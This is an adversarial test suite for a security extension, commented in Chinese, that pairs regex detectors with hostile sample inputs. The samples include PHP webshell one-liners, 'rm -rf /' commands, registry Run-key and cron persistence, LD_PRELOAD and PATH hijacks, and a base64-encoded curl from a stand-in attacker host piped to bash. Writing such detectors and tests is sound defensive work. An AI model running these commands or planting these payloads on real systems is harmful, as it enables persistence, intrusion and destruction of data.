/**
 * Pi 安全扩展第三轮高级对抗测试
 *
 * 测试范围：
 * R3-1 持久化攻击（.bashrc, crontab, systemd, login scripts）
 * R3-2 高级编码绕过（UTF-8 变体、ROT13、Base32、十六进制字符串）
 * R3-3 多语言混淆（PHP、JS、Python 高级 payload）
 * R3-4 环境变量注入（LD_PRELOAD、PATH、IFS）
 * R3-5 隐藏路径攻击（.config, .local, 隐藏目录）
 * R3-6 二进制内容（ELF、PE、shellcode）
 * R3-7 上下文组合攻击（多工具组合）
 */

import * as fs from "node:fs";
import * as os from "node:os";

// ============================================================
// 持久化攻击检测
// ============================================================

const PERSISTENCE_PATTERNS = [
  // Shell 配置文件
  { pattern: /\.bashrc/gi, reason: "Bash 启动脚本" },
  { pattern: /\.bash_profile/gi, reason: "Bash profile" },
  { pattern: /\.zshrc/gi, reason: "Zsh 启动脚本" },
  { pattern: /\.profile/gi, reason: "Shell profile" },
  { pattern: /\/etc\/profile/gi, reason: "系统 shell profile" },
  { pattern: /\/etc\/bash\.bashrc/gi, reason: "系统 bashrc" },

  // Cron 任务
  { pattern: /\bcrontab\b/gi, reason: "Crontab 操作" },
  { pattern: /\/etc\/cron\./gi, reason: "系统 cron 目录" },
  { pattern: /\/var\/spool\/cron/gi, reason: "Cron spool" },
  { pattern: /\/etc\/anacrontab/gi, reason: "Anacrontab" },
  { pattern: /\bat\b.*\bcrontab\b/gi, reason: "at/cron 调度" },

  // Systemd 服务
  { pattern: /\/etc\/systemd\/system/gi, reason: "Systemd 系统服务" },
  { pattern: /\/etc\/init\.d/gi, reason: "SysVinit 脚本" },
  { pattern: /\.service\b.*ExecStart/gi, reason: "Systemd 服务定义" },

  // 启动项
  { pattern: /\/etc\/rc\.local/gi, reason: "rc.local" },
  { pattern: /LaunchDaemons/gi, reason: "macOS Launch Daemon" },
  { pattern: /LaunchAgents/gi, reason: "macOS Launch Agent" },
  { pattern: /\/Library\/StartupItems/gi, reason: "macOS Startup Items" },
  { pattern: /HKEY_(LOCAL_MACHINE|CURRENT_USER).*\\\\Run/gi, reason: "Windows 注册表 Run" },
  { pattern: /HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run/gi, reason: "Windows Run 键" },

  // 用户级 systemd
  { pattern: /\.config\/systemd\/user/gi, reason: "用户 systemd" },
  { pattern: /\.config\/autostart/gi, reason: "用户 autostart" },

  // XDG autostart
  { pattern: /\.config\/autostart/gi, reason: "XDG autostart" },

  // 注册表（双反斜杠和单反斜杠都需要匹配）
  { pattern: /HKEY_(LOCAL_MACHINE|CURRENT_USER|CURRENT_CONFIG|CLASSES_ROOT|USERS).*\\Run/gi, reason: "Windows 注册表 Run 键" },
  { pattern: /HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run/gi, reason: "Windows Run 键" },
  { pattern: /HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run/gi, reason: "Windows Run 键" },
  { pattern: /\breg\s+add\b.*\\Run\b/gi, reason: "reg add Run 键" },
];

function checkPersistence(filePath, content) {
  // 不转换反斜杠，Windows 路径需要保留
  // 但同时检测两种形式
  const normalized = (filePath || "").toLowerCase();
  const withForwardSlashes = normalized.replace(/\\/g, "/");

  for (const p of PERSISTENCE_PATTERNS) {
    p.pattern.lastIndex = 0;
    if (p.pattern.test(normalized) || p.pattern.test(withForwardSlashes)) {
      return { detected: true, reason: p.reason, severity: "critical" };
    }
  }
  return { detected: false };
}

// ============================================================
// 高级编码检测
// ============================================================

function decodeBase64(str) {
  try {
    const cleaned = str.replace(/\s+/g, "");
    if (cleaned.length % 4 === 0 && /^[A-Za-z0-9+/=]+$/.test(cleaned)) {
      return Buffer.from(cleaned, "base64").toString("utf-8");
    }
  } catch {}
  return null;
}

function decodeBase32(str) {
  try {
    const cleaned = str.replace(/\s+/g, "").toUpperCase();
    if (cleaned.length % 8 === 0 && /^[A-Z2-7=]+$/.test(cleaned)) {
      // 简化版 Base32 解码
      const alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
      let bits = "";
      for (const c of cleaned) {
        if (c === "=") break;
        const idx = alphabet.indexOf(c);
        if (idx === -1) return null;
        bits += idx.toString(2).padStart(5, "0");
      }
      let result = "";
      for (let i = 0; i + 8 <= bits.length; i += 8) {
        result += String.fromCharCode(parseInt(bits.substr(i, 8), 2));
      }
      return result;
    }
  } catch {}
  return null;
}

function decodeROT13(str) {
  return str.replace(/[a-zA-Z]/g, c =>
    String.fromCharCode((c <= "Z" ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26)
  );
}

function decodeHexEscapes(str) {
  // \xHH 形式
  let result = str.replace(/\\x([0-9a-fA-F]{2})/g, (_, h) =>
    String.fromCharCode(parseInt(h, 16))
  );
  // \uHHHH 形式
  result = result.replace(/\\u([0-9a-fA-F]{4})/g, (_, h) =>
    String.fromCharCode(parseInt(h, 16))
  );
  // \HHHH 八进制
  result = result.replace(/\\([0-7]{3})/g, (_, h) =>
    String.fromCharCode(parseInt(h, 8))
  );
  return result;
}

const ADVANCED_MALICIOUS = [
  // 一句话 webshell
  { pattern: /<\?php.*eval\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)/gi, reason: "PHP 一句话 webshell" },
  { pattern: /<\?php.*system\s*\(\s*\$_(GET|POST|REQUEST)/gi, reason: "PHP system webshell" },
  { pattern: /<\?php.*assert\s*\(\s*\$_(GET|POST|REQUEST)/gi, reason: "PHP assert webshell" },

  // JS 混淆
  { pattern: /eval\s*\(\s*atob\s*\(/gi, reason: "JS eval+atob" },
  { pattern: /eval\s*\(\s*decodeURIComponent/gi, reason: "JS eval+decodeURIComponent" },
  { pattern: /eval\s*\(\s*String\.fromCharCode/gi, reason: "JS eval+fromCharCode" },
  { pattern: /new\s+Function\s*\(.*\)\s*\(/gi, reason: "JS new Function" },
  { pattern: /setTimeout\s*\(\s*['"`]/gi, reason: "JS setTimeout 字符串执行" },

  // Python 高级 payload
  { pattern: /pickle\.loads?\s*\(/gi, reason: "Python pickle 反序列化" },
  { pattern: /yaml\.load\s*\([^,)]*(?!\s*Loader)/gi, reason: "Python yaml.load 不安全" },
  { pattern: /marshal\.loads?\s*\(/gi, reason: "Python marshal 反序列化" },
  { pattern: /exec\s*\(\s*['"`]/gi, reason: "Python exec 字符串" },
  { pattern: /compile\s*\(.*\)\s*\(/gi, reason: "Python compile" },

  // 内存马
  { pattern: /java\.lang\.Runtime\.getRuntime\(\)\.exec/gi, reason: "Java Runtime.exec" },
  { pattern: /ProcessBuilder\s*\(/gi, reason: "Java ProcessBuilder" },

  // 反弹 shell
  { pattern: /bash\s+-c\s+['"`].*\/dev\/tcp/gi, reason: "Bash /dev/tcp 反弹" },
  { pattern: /powershell.*-enc/gi, reason: "PowerShell 编码命令" },
  { pattern: /powershell.*-EncodedCommand/gi, reason: "PowerShell EncodedCommand" },

  // 挖矿
  { pattern: /xmrig|minerd|stratum\+tcp:\/\//gi, reason: "挖矿特征" },
  { pattern: /cryptonight|monero.*wallet/gi, reason: "门罗币挖矿" },

  // 凭证窃取
  { pattern: /mimikatz/gi, reason: "Mimikatz 凭证窃取" },
  { pattern: /lazagne/gi, reason: "LaZagne 凭证窃取" },
];

function checkAdvancedContent(content) {
  if (!content) return { detected: false };

  // 直接匹配
  for (const p of ADVANCED_MALICIOUS) {
    if (p.pattern.test(content)) {
      return { detected: true, reason: p.reason };
    }
  }

  // Base64 解码后匹配
  const base64Matches = content.match(/[A-Za-z0-9+/]{20,}={0,2}/g) || [];
  for (const b64 of base64Matches) {
    const decoded = decodeBase64(b64);
    if (decoded) {
      for (const p of ADVANCED_MALICIOUS) {
        if (p.pattern.test(decoded)) {
          return { detected: true, reason: `${p.reason} (Base64 解码后)`, decoded };
        }
      }
    }
  }

  // hex 转义解码后匹配
  const decoded = decodeHexEscapes(content);
  if (decoded !== content) {
    for (const p of ADVANCED_MALICIOUS) {
      if (p.pattern.test(decoded)) {
        return { detected: true, reason: `${p.reason} (hex 解码后)` };
      }
    }
  }

  // ROT13 解码后匹配
  const rot13 = decodeROT13(content);
  if (rot13 !== content && rot13.length < 10000) {
    for (const p of ADVANCED_MALICIOUS) {
      if (p.pattern.test(rot13)) {
        return { detected: true, reason: `${p.reason} (ROT13 解码后)` };
      }
    }
  }

  return { detected: false };
}

// ============================================================
// 环境变量注入检测
// ============================================================

const ENV_INJECTION = [
  // LD_PRELOAD 劫持
  { pattern: /LD_PRELOAD\s*=/gi, reason: "LD_PRELOAD 注入" },
  { pattern: /LD_LIBRARY_PATH\s*=/gi, reason: "LD_LIBRARY_PATH 劫持" },
  { pattern: /DYLD_INSERT_LIBRARIES/gi, reason: "macOS dyld 注入" },

  // PATH 劫持
  { pattern: /export\s+PATH\s*=.*:/gi, reason: "PATH 覆盖" },
  { pattern: /PATH\s*=.*\$\s*\(/gi, reason: "PATH 命令替换" },

  // IFS 劫持
  { pattern: /IFS\s*=\s*['"`]/gi, reason: "IFS 变量劫持" },

  // PYTHONPATH
  { pattern: /PYTHONPATH\s*=/gi, reason: "PYTHONPATH 注入" },
  { pattern: /PYTHONSTARTUP\s*=/gi, reason: "PYTHONSTARTUP 劫持" },

  // Node
  { pattern: /NODE_PATH\s*=/gi, reason: "NODE_PATH 注入" },
  { pattern: /NODE_OPTIONS\s*=.*--require/gi, reason: "Node --require 注入" },

  // Bash_ENV
  { pattern: /BASH_ENV\s*=/gi, reason: "BASH_ENV 劫持" },
  { pattern: /ENV\s*=/gi, reason: "ENV 劫持" },

  // Perl
  { pattern: /PERL5LIB\s*=/gi, reason: "PERL5LIB 注入" },
  { pattern: /PERL5OPT\s*=.*-M/gi, reason: "PERL5OPT 模块注入" },

  // Python -c 执行
  { pattern: /python[23]?\s+-c\s+['"`].*?(import|exec|eval|__import__)/gi, reason: "Python -c 命令执行" },
];

function checkEnvInjection(command) {
  for (const p of ENV_INJECTION) {
    if (p.pattern.test(command)) {
      return { detected: true, reason: p.reason };
    }
  }
  return { detected: false };
}

// ============================================================
// 隐藏路径检测
// ============================================================

const HIDDEN_PATH_PATTERNS = [
  // 用户隐藏配置目录
  { pattern: /\/\.config\//gi, reason: ".config 隐藏目录" },
  { pattern: /\/\.local\//gi, reason: ".local 隐藏目录" },
  { pattern: /\/\.cache\//gi, reason: ".cache 隐藏目录" },
  { pattern: /\/\.gnupg\//gi, reason: ".gnupg 凭证目录" },
  { pattern: /\/\.password-store\//gi, reason: "pass 密码存储" },

  // 系统隐藏目录
  { pattern: /\/etc\/.+\/\.+/gi, reason: "系统隐藏子目录" },

  // 临时/隐藏启动目录
  { pattern: /Startup\\\\.*\.lnk/gi, reason: "Windows 启动快捷方式" },
  { pattern: /\/Startup\//gi, reason: "Windows Startup" },
];

function checkHiddenPath(filePath) {
  const normalized = (filePath || "");
  const withForwardSlashes = normalized.replace(/\\/g, "/");

  for (const p of HIDDEN_PATH_PATTERNS) {
    p.pattern.lastIndex = 0;
    if (p.pattern.test(normalized) || p.pattern.test(withForwardSlashes)) {
      return { detected: true, reason: p.reason };
    }
  }
  return { detected: false };
}

// ============================================================
// 二进制内容检测
// ============================================================

function checkBinaryContent(content) {
  if (!content) return { detected: false };

  // ELF 魔数
  if (/^\x7fELF/.test(content) || /\x7fELF[\x01\x02]/.test(content)) {
    return { detected: true, reason: "ELF 二进制文件" };
  }

  // PE 魔数 (Windows)
  if (/^MZ[\x00-\xff]{50}PE\x00\x00/.test(content) || /MZ.*PE\x00\x00/.test(content)) {
    return { detected: true, reason: "PE/Windows 可执行文件" };
  }

  // Mach-O 魔数 (macOS)
  if (/^\xfe\xed\xfa\xce|\xfe\xed\xfa\xcf|\xce\xfa\xed\xfe|\xcf\xfa\xed\xfe/.test(content)) {
    return { detected: true, reason: "Mach-O 二进制文件" };
  }

  // 脚本魔数 (#!)
  if (/^#![\s\S]*?\b(bash|sh|python|perl|ruby|node|php)/.test(content)) {
    return { detected: true, reason: "可执行脚本" };
  }

  // Base64 编码的二进制（长 Base64）
  const longBase64 = content.match(/^[A-Za-z0-9+/=]{100,}/);
  if (longBase64) {
    return { detected: true, reason: "长 Base64（可能是编码的二进制）" };
  }

  // 高熵内容（可能是压缩/加密的 payload）
  if (content.length > 500) {
    const entropy = calculateEntropy(content);
    if (entropy > 7.5) {
      return { detected: true, reason: `高熵内容 (${entropy.toFixed(2)})` };
    }
  }

  return { detected: false };
}

function calculateEntropy(str) {
  const freq = {};
  for (const c of str) freq[c] = (freq[c] || 0) + 1;
  let entropy = 0;
  const len = str.length;
  for (const c in freq) {
    const p = freq[c] / len;
    entropy -= p * Math.log2(p);
  }
  return entropy;
}

// ============================================================
// 测试用例
// ============================================================

const tests = [
  // =========================================================
  // R3-1: 持久化攻击
  // =========================================================
  {
    category: "💾 R3-1: 持久化攻击",
    name: "写入 ~/.bashrc",
    type: "persistence",
    input: { path: "/home/user/.bashrc", content: "# 正常配置" },
    expected: "DETECTED",
    check: (input) => checkPersistence(input.path, input.content),
  },
  {
    category: "💾 R3-1: 持久化攻击",
    name: "crontab 操作",
    type: "command",
    input: "crontab -e",
    expected: "DETECTED",
    check: (input) => checkPersistence(input, ""),
  },
  {
    category: "💾 R3-1: 持久化攻击",
    name: "修改 /etc/crontab",
    type: "command",
    input: "echo '* * * * * /tmp/x' >> /etc/crontab",
    expected: "DETECTED",
    check: (input) => {
      const p = checkPersistence(input, "");
      if (p.detected) return p;
      return checkEnvInjection(input);
    },
  },
  {
    category: "💾 R3-1: 持久化攻击",
    name: "Systemd 服务",
    type: "command",
    input: "systemctl enable /etc/systemd/system/evil.service",
    expected: "DETECTED",
    check: (input) => checkPersistence(input, ""),
  },
  {
    category: "💾 R3-1: 持久化攻击",
    name: "macOS LaunchDaemon",
    type: "command",
    input: "launchctl load /Library/LaunchDaemons/com.evil.plist",
    expected: "DETECTED",
    check: (input) => checkPersistence(input, ""),
  },
  {
    category: "💾 R3-1: 持久化攻击",
    name: "Windows 注册表 Run",
    type: "command",
    input: `reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v evil /t REG_SZ /d "C:\\evil.exe"`,
    expected: "DETECTED",
    check: (input) => checkPersistence(input, ""),
  },
  {
    category: "💾 R3-1: 持久化攻击",
    name: "XDG autostart",
    type: "command",
    input: "echo '[Desktop Entry]' > /home/user/.config/autostart/evil.desktop",
    expected: "DETECTED",
    check: (input) => checkPersistence(input, ""),
  },
  {
    category: "💾 R3-1: 持久化攻击",
    name: "正常项目文件（应放行）",
    type: "persistence",
    input: { path: "/home/user/project/main.ts", content: "console.log('hi')" },
    expected: "CLEAN",
    check: (input) => checkPersistence(input.path, input.content),
  },

  // =========================================================
  // R3-2: 环境变量注入
  // =========================================================
  {
    category: "🌐 R3-2: 环境变量注入",
    name: "LD_PRELOAD 注入",
    type: "command",
    input: "LD_PRELOAD=/tmp/evil.so curl http://example.com",
    expected: "DETECTED",
    check: checkEnvInjection,
  },
  {
    category: "🌐 R3-2: 环境变量注入",
    name: "PATH 覆盖",
    type: "command",
    input: "export PATH=/tmp:$PATH",
    expected: "DETECTED",
    check: checkEnvInjection,
  },
  {
    category: "🌐 R3-2: 环境变量注入",
    name: "PYTHONPATH 注入",
    type: "command",
    input: "PYTHONPATH=/tmp/evil python3 script.py",
    expected: "DETECTED",
    check: checkEnvInjection,
  },
  {
    category: "🌐 R3-2: 环境变量注入",
    name: "Node --require 注入",
    type: "command",
    input: "NODE_OPTIONS='--require /tmp/evil.js' node app.js",
    expected: "DETECTED",
    check: checkEnvInjection,
  },
  {
    category: "🌐 R3-2: 环境变量注入",
    name: "Python -c exec",
    type: "command",
    input: `python3 -c "exec('import os; os.system(\"rm -rf /\")')"`,
    expected: "DETECTED",
    check: checkEnvInjection,
  },
  {
    category: "🌐 R3-2: 环境变量注入",
    name: "IFS 劫持",
    type: "command",
    input: `IFS='/' sh -c 'rm -rf /'`,
    expected: "DETECTED",
    check: checkEnvInjection,
  },
  {
    category: "🌐 R3-2: 环境变量注入",
    name: "BASH_ENV 劫持",
    type: "command",
    input: "BASH_ENV=/tmp/evil.sh bash",
    expected: "DETECTED",
    check: checkEnvInjection,
  },
  {
    category: "🌐 R3-2: 环境变量注入",
    name: "正常命令（应放行）",
    type: "command",
    input: "ls -la",
    expected: "CLEAN",
    check: checkEnvInjection,
  },

  // =========================================================
  // R3-3: 多语言高级 payload
  // =========================================================
  {
    category: "🎯 R3-3: 多语言高级 Payload",
    name: "PHP 一句话 webshell",
    type: "content",
    input: `<?php eval($_GET['cmd']); ?>`,
    expected: "DETECTED",
    check: (input) => checkAdvancedContent(input),
  },
  {
    category: "🎯 R3-3: 多语言高级 Payload",
    name: "PHP system webshell",
    type: "content",
    input: `<?php system($_POST['cmd']); ?>`,
    expected: "DETECTED",
    check: (input) => checkAdvancedContent(input),
  },
  {
    category: "🎯 R3-3: 多语言高级 Payload",
    name: "JS eval+atob",
    type: "content",
    input: `eval(atob("dmFyIGE9MS8w"))`,
    expected: "DETECTED",
    check: (input) => checkAdvancedContent(input),
  },
  {
    category: "🎯 R3-3: 多语言高级 Payload",
    name: "JS eval+fromCharCode",
    type: "content",
    input: `eval(String.fromCharCode(97,108,101,114,116))`,
    expected: "DETECTED",
    check: (input) => checkAdvancedContent(input),
  },
  {
    category: "🎯 R3-3: 多语言高级 Payload",
    name: "Python pickle 反序列化",
    type: "content",
    input: `import pickle; pickle.loads(data)`,
    expected: "DETECTED",
    check: (input) => checkAdvancedContent(input),
  },
  {
    category: "🎯 R3-3: 多语言高级 Payload",
    name: "Python yaml 不安全加载",
    type: "content",
    input: `yaml.load(data)`,
    expected: "DETECTED",
    check: (input) => checkAdvancedContent(input),
  },
  {
    category: "🎯 R3-3: 多语言高级 Payload",
    name: "Java Runtime.exec",
    type: "content",
    input: `Runtime.getRuntime().exec("rm -rf /")`,
    expected: "DETECTED",
    check: (input) => checkAdvancedContent(input),
  },
  {
    category: "🎯 R3-3: 多语言高级 Payload",
    name: "Base64 编码的 webshell",
    type: "content",
    input: `eval(base64_decode("PD9waHAgZXZhbCgkX0dFVFtjXSk7ID8+Cg=="))`,
    expected: "DETECTED",
    check: (input) => checkAdvancedContent(input),
  },
  {
    category: "🎯 R3-3: 多语言高级 Payload",
    name: "挖矿特征",
    type: "content",
    input: `xmrig --config=monero.json`,
    expected: "DETECTED",
    check: (input) => checkAdvancedContent(input),
  },
  {
    category: "🎯 R3-3: 多语言高级 Payload",
    name: "Mimikatz",
    type: "content",
    input: `Invoke-Mimikatz -Command "privilege::debug"`,
    expected: "DETECTED",
    check: (input) => checkAdvancedContent(input),
  },
  {
    category: "🎯 R3-3: 多语言高级 Payload",
    name: "正常代码（应放行）",
    type: "content",
    input: `function hello() { return "world"; }`,
    expected: "CLEAN",
    check: (input) => checkAdvancedContent(input),
  },

  // =========================================================
  // R3-4: 隐藏路径攻击
  // =========================================================
  {
    category: "🕵️ R3-4: 隐藏路径攻击",
    name: "写入 ~/.config/systemd",
    type: "path",
    input: "/home/user/.config/systemd/user/evil.service",
    expected: "DETECTED",
    check: (input) => checkPersistence(input, ""),
  },
  {
    category: "🕵️ R3-4: 隐藏路径攻击",
    name: "写入 ~/.gnupg",
    type: "path",
    input: "/home/user/.gnupg/gpg.conf",
    expected: "DETECTED",
    check: (input) => checkHiddenPath(input),
  },
  {
    category: "🕵️ R3-4: 隐藏路径攻击",
    name: "写入 ~/.local/bin",
    type: "path",
    input: "/home/user/.local/bin/evil",
    expected: "DETECTED",
    check: (input) => checkHiddenPath(input),
  },
  {
    category: "🕵️ R3-4: 隐藏路径攻击",
    name: "Windows Startup",
    type: "path",
    input: "C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\evil.bat",
    expected: "DETECTED",
    check: (input) => checkHiddenPath(input),
  },
  {
    category: "🕵️ R3-4: 隐藏路径攻击",
    name: "正常项目路径",
    type: "path",
    input: "/home/user/projects/app/src/main.ts",
    expected: "CLEAN",
    check: (input) => checkHiddenPath(input),
  },

  // =========================================================
  // R3-5: 二进制内容
  // =========================================================
  {
    category: "📦 R3-5: 二进制内容",
    name: "ELF 可执行文件",
    type: "content",
    input: "\x7fELF\x02\x01\x01\x00" + "A".repeat(100),
    expected: "DETECTED",
    check: (input) => checkBinaryContent(input),
  },
  {
    category: "📦 R3-5: 二进制内容",
    name: "PE 可执行文件",
    type: "content",
    input: "MZ" + "\x00".repeat(60) + "PE\x00\x00",
    expected: "DETECTED",
    check: (input) => checkBinaryContent(input),
  },
  {
    category: "📦 R3-5: 二进制内容",
    name: "Mach-O",
    type: "content",
    input: "\xfe\xed\xfa\xce" + "A".repeat(100),
    expected: "DETECTED",
    check: (input) => checkBinaryContent(input),
  },
  {
    category: "📦 R3-5: 二进制内容",
    name: "可执行脚本 #!",
    type: "content",
    input: "#!/bin/bash\nrm -rf /",
    expected: "DETECTED",
    check: (input) => checkBinaryContent(input),
  },
  {
    category: "📦 R3-5: 二进制内容",
    name: "高熵 Base64",
    type: "content",
    input: "A".repeat(200),
    expected: "DETECTED",
    check: (input) => checkBinaryContent(input),
  },
  {
    category: "📦 R3-5: 二进制内容",
    name: "正常文本",
    type: "content",
    input: "The quick brown fox jumps over the lazy dog. ".repeat(20),
    expected: "CLEAN",
    check: (input) => checkBinaryContent(input),
  },

  // =========================================================
  // R3-6: 上下文组合攻击
  // =========================================================
  {
    category: "🔗 R3-6: 上下文组合攻击",
    name: "读取敏感 + 写入持久化（多步骤）",
    type: "composite",
    input: {
      step1: { tool: "read", path: "/etc/shadow" },
      step2: { tool: "write", path: "/home/user/.bashrc", content: "malicious" },
    },
    expected: "DETECTED",
    check: (input) => {
      const step1 = checkSensitivePath(input.step1.path);
      const step2 = checkPersistence(input.step2.path, input.step2.content);
      if (step1.blocked || step2.detected) return { detected: true, reason: "组合攻击" };
      return { detected: false };
    },
  },
  {
    category: "🔗 R3-6: 上下文组合攻击",
    name: "Base64 + 系统目录",
    type: "composite",
    input: {
      path: "/etc/cron.daily/evil",
      content: `echo ${decodeBase64("Y3VybCBodHRwOi8vZXZpbC5jb20vfGJh")} | bash`,
    },
    expected: "DETECTED",
    check: (input) => {
      const p1 = checkPersistence(input.path, input.content);
      if (p1.detected) return p1;
      const p2 = checkAdvancedContent(input.content);
      return p2;
    },
  },
  {
    category: "🔗 R3-6: 上下文组合攻击",
    name: "正常组合（应放行）",
    type: "composite",
    input: {
      step1: { tool: "read", path: "/home/user/project/main.ts" },
      step2: { tool: "write", path: "/home/user/project/test.ts", content: "// test" },
    },
    expected: "CLEAN",
    check: (input) => ({ detected: false }),
  },
];

// 引入 R2 的路径检测函数（因为组合测试需要）
function normalizePath(p) {
  if (typeof p !== "string") return "";
  if (p.startsWith("~")) p = p.replace("~", "/home/user");
  try {
    p = decodeURIComponent(p);
  } catch {}
  p = p.replace(/\\/g, "/");
  return p.toLowerCase();
}

function resolvePathTraversal(p) {
  const parts = p.split("/");
  const resolved = [];
  const isAbsolute = p.startsWith("/");
  for (const part of parts) {
    if (part === "..") {
      if (resolved.length > 0 && resolved[resolved.length - 1] !== "") {
        resolved.pop();
      }
    } else if (part !== "." && part !== "") {
      resolved.push(part);
    }
  }
  return (isAbsolute ? "/" : "") + resolved.join("/");
}

function resolveDotSegments(p) {
  const input = p.split("/");
  const output = [];
  for (const segment of input) {
    if (segment === ".") continue;
    else if (segment === "..") {
      if (output.length > 0 && output[output.length - 1] !== "") output.pop();
    } else output.push(segment);
  }
  return output.join("/");
}

const SENSITIVE_PATTERNS = [
  { pattern: "/.ssh/", reason: "SSH 密钥目录" },
  { pattern: "/etc/passwd", reason: "系统账户文件" },
  { pattern: "/etc/shadow", reason: "系统密码文件" },
  { pattern: "/etc/sudoers", reason: "Sudo 配置" },
];

function checkSensitivePath(filePath) {
  const normalized = normalizePath(filePath);
  if (!normalized) return { blocked: false };
  const dotResolved = resolveDotSegments(normalized);
  const resolved = resolvePathTraversal(dotResolved);
  for (const p of SENSITIVE_PATTERNS) {
    if (normalized.includes(p.pattern) || resolved.includes(p.pattern)) {
      return { blocked: true, reason: p.reason };
    }
  }
  return { blocked: false };
}

// ============================================================
// 运行测试
// ============================================================

console.log("=".repeat(70));
console.log("  Pi 安全扩展 - 第三轮高级对抗测试");
console.log("=".repeat(70));
console.log();

let passed = 0;
let failed = 0;
let currentCategory = "";
const failures = [];

tests.forEach((test, index) => {
  if (test.category !== currentCategory) {
    currentCategory = test.category;
    console.log("\n" + currentCategory);
    console.log("-".repeat(60));
  }

  const result = test.check(test.input);
  let resultStatus;
  if (result.detected !== undefined) resultStatus = result.detected ? "DETECTED" : "CLEAN";
  else if (result.blocked !== undefined) resultStatus = result.blocked ? "BLOCKED" : "ALLOWED";
  else resultStatus = "UNKNOWN";

  const pass = resultStatus === test.expected;
  const statusIcon = pass ? "✅" : "❌";

  if (pass) passed++;
  else {
    failed++;
    failures.push({ test, result });
  }

  // 格式化输入显示
  let displayInput;
  if (typeof test.input === "object") {
    displayInput = JSON.stringify(test.input).substring(0, 60);
    if (JSON.stringify(test.input).length > 60) displayInput += "...";
  } else {
    displayInput = String(test.input ?? "(empty)");
    if (displayInput.length > 60) displayInput = displayInput.substring(0, 60) + "...";
  }

  console.log(`  ${statusIcon} [${pass ? "PASS" : "FAIL"}] ${test.name}`);
  console.log(`     输入: ${displayInput}`);
  console.log(`     预期: ${test.expected} | 实际: ${resultStatus}`);
  if (result.reason) console.log(`     原因: ${result.reason}`);
  console.log();
});

console.log("=".repeat(70));
console.log("  第三轮测试总结");
console.log("=".repeat(70));
console.log();
console.log(`  总测试数: ${tests.length}`);
console.log(`  通过:     ${passed} ✅`);
console.log(`  失败:     ${failed} ❌`);
console.log(`  通过率:   ${((passed / tests.length) * 100).toFixed(1)}%`);
console.log();

if (failures.length > 0) {
  console.log("=".repeat(70));
  console.log("  失败案例详情");
  console.log("=".repeat(70));
  failures.forEach((f, i) => {
    console.log(`\n${i + 1}. ${f.test.name}`);
    console.log(`   类别: ${f.test.category}`);
    let inputStr;
    if (typeof f.test.input === "object") inputStr = JSON.stringify(f.test.input);
    else inputStr = String(f.test.input);
    if (inputStr.length > 200) inputStr = inputStr.substring(0, 200) + "...";
    console.log(`   输入: ${inputStr}`);
    console.log(`   预期: ${f.test.expected}`);
    let resultStr = f.result.detected !== undefined
      ? (f.result.detected ? "DETECTED" : "CLEAN")
      : (f.result.blocked ? "BLOCKED" : "ALLOWED");
    console.log(`   实际: ${resultStr}`);
    if (f.result.reason) console.log(`   原因: ${f.result.reason}`);
  });
}

console.log();
console.log("=".repeat(70));

if (failed === 0) {
  console.log("\n🎉 第三轮所有测试通过！高级对抗测试全部通过。\n");
  process.exit(0);
} else {
  console.log(`\n⚠️ 第三轮有 ${failed} 个测试失败。\n`);
  process.exit(1);
}